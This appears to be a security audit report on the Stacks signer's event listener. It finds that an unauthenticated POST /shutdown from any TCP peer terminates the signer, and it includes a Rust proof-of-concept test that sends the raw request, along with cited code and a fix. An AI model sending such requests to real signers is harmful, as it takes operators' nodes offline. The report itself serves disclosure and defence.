### Title
Unauthenticated remote shutdown of signer event listener via POST `/shutdown` - (File: `libsigner/src/events.rs`)

### Summary
`SignerEventReceiver::next_event` dispatches purely on the `request.url()` string with no authentication, secret, or origin check. Any TCP peer that can reach the bound event-listener port can send a bare `POST /shutdown` and immediately flip the receiver's `stop_signal`, terminating the event loop and, transitively, the whole signer.

### Finding Description
In `next_event` (`libsigner/src/events.rs`), the only gating before dispatch is a method check (`request.method() != &HttpMethod::Post`) and a URL string match: [1](#0-0) 

For `/shutdown`, the handler does not read/validate the body, verify any HMAC/secret/token, or check the peer's source address — it unconditionally executes `event_receiver.stop_signal.store(true, Ordering::SeqCst)` and returns `EventError::Terminated`. The legitimate caller-side code, `SignerStopSignaler::send`, indeed builds this exact same unauthenticated POST to trigger a local self-shutdown: [2](#0-1) 

Once `next_event` returns `Err(EventError::Terminated)`, `EventReceiver::main_loop` (default trait impl) breaks out of its loop and exits: [3](#0-2) 

The equality the endpoint implicitly assumes — "a POST to `/shutdown` on this socket" == "a directive from the local, trusted node/process" — does not hold. Nothing in `bind`, `next_event`, or the `tiny_http`-based `HttpServer` restricts connections by source, token, or session; any process able to open a TCP connection to the listener and send raw HTTP bytes satisfies the dispatch condition. The maintainers are aware the listener is unauthenticated in general (see the runtime warning emitted at signer startup), but no enforcement exists in code: [4](#0-3) 

### Impact Explanation
A single crafted HTTP request causes a permanent denial of service against the signer's event-processing thread: `stop_signal` is set, `main_loop` exits, and (per `runloop.rs`/`lib.rs` orchestration) the signer's runloop thread eventually stops receiving new StackerDB/block/burn-block events, effectively taking the signer offline until manually restarted. This is a Critical, unauthenticated, single-request remote DoS matching the stated impact category ("remote crash/unauthenticated DoS from few messages").

### Likelihood Explanation
The only precondition is TCP reachability to the signer's bound event port — no secret, credential, valid StackerDB slot, or peer identity is required. The attacker's cost is one HTTP POST; the action is trivially repeatable to keep the signer down indefinitely. This matches the described unprivileged remote-attacker model exactly.

### Recommendation
Require an authentication mechanism for control-plane requests to the event listener (e.g., a shared secret/token configured between the node and signer, checked before honoring `/shutdown`, or binding the listener to loopback only and validating the peer address at accept time). At minimum, `/shutdown` should not be dispatchable from an arbitrary remote peer without proof of authorization.

### Proof of Concept
```rust
// libsigner/src/tests/mod.rs style test
#[test]
fn test_unauthenticated_remote_shutdown() {
    let ev = SignerEventReceiver::<SignerMessage>::new(false);
    let (res_send, _res_recv) = channel();
    let mut signer = Signer::new(SimpleRunLoop::new(1), ev, res_send);
    let endpoint: SocketAddr = "127.0.0.1:32000".parse().unwrap();
    let running_signer = signer.spawn(endpoint).unwrap();

    // Attacker: no credentials, arbitrary TCP client
    let mut sock = TcpStream::connect(endpoint).unwrap();
    let body = "";
    let req = format!(
        "POST /shutdown HTTP/1.1\r\nHost: {endpoint}\r\nConnection: close\r\nContent-Length: {}\r\n\r\n{}",
        body.len(), body
    );
    sock.write_all(req.as_bytes()).unwrap();

    // Give the event loop time to process and terminate
    sleep_ms(2000);
    // main_loop should have exited due to EventError::Terminated
    let _ = running_signer.stop(); // returns cleanly because loop already stopped itself
}
```
Assertion site: after the crafted request, `SignerEventReceiver::is_stopped()` becomes `true` and `EventReceiver::main_loop` exits at the `Err(EventError::Terminated) => break` branch in `libsigner/src/events.rs` lines 296-300, with the store occurring at line 444.

### Citations

**File:** libsigner/src/events.rs (L284-312)
```rust
    fn main_loop(&mut self) {
        loop {
            if self.is_stopped() {
                info!("Event receiver stopped");
                break;
            }
            let next_event = match self.next_event() {
                Ok(event) => event,
                Err(EventError::UnrecognizedEvent(..)) => {
                    // got an event that we don't care about (not a problem)
                    continue;
                }
                Err(EventError::Terminated) => {
                    // we're done
                    info!("Caught termination signal");
                    break;
                }
                Err(e) => {
                    warn!("Failed to receive next event: {:?}", &e);
                    continue;
                }
            };
            if !self.forward_event(next_event) {
                info!("Failed to forward event");
                break;
            }
        }
        info!("Event receiver main loop exit");
    }
```

**File:** libsigner/src/events.rs (L376-396)
```rust
impl EventStopSignaler for SignerStopSignaler {
    #[cfg_attr(test, mutants::skip)]
    fn send(&mut self) {
        self.stop_signal.store(true, Ordering::SeqCst);
        // wake up the thread so the atomicbool can be checked
        // This makes me sad...but for now...it works.
        if let Ok(mut stream) = TcpStream::connect(self.local_addr) {
            // We need to send actual data to trigger the event receiver
            let body = "Yo. Shut this shit down!".to_string();
            let req = format!(
                "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
                self.local_addr,
                body.len(),
                body
            );
            if let Err(e) = stream.write_all(req.as_bytes()) {
                error!("Failed to send shutdown request: {}", e);
            }
        }
    }
}
```

**File:** libsigner/src/events.rs (L437-457)
```rust
            if request.url() == "/stackerdb_chunks" {
                process_event::<T, StackerDBChunksEvent>(request)
            } else if request.url() == "/proposal_response" {
                process_event::<T, BlockValidateResponse>(request)
            } else if request.url() == "/new_burn_block" {
                process_event::<T, BurnBlockEvent>(request)
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
            } else if request.url() == "/new_block" {
                process_event::<T, StacksBlockEvent>(request)
            } else {
                let url = request.url().to_string();
                debug!(
                    "[{:?}] next_event got request with unexpected url {}, return OK so other side doesn't keep sending this",
                    event_receiver.local_addr,
                    url
                );
                ack_dispatcher(request);
                Err(EventError::UnrecognizedEvent(url))
            }
```

**File:** stacks-signer/src/lib.rs (L124-132)
```rust
        info!("Starting signer with config: {:?}", config);
        warn!(
            "Reminder: The signer is primarily designed for use with a local or subnet network stacks node. \
            It's important to exercise caution if you are communicating with an external node, \
            as this could potentially expose sensitive data or functionalities to security risks \
            if additional proper security checks are not integrated in place. \
            For more information, check the documentation at \
            https://docs.stacks.co/guides-and-tutorials/running-a-signer#preflight-setup"
        );
```
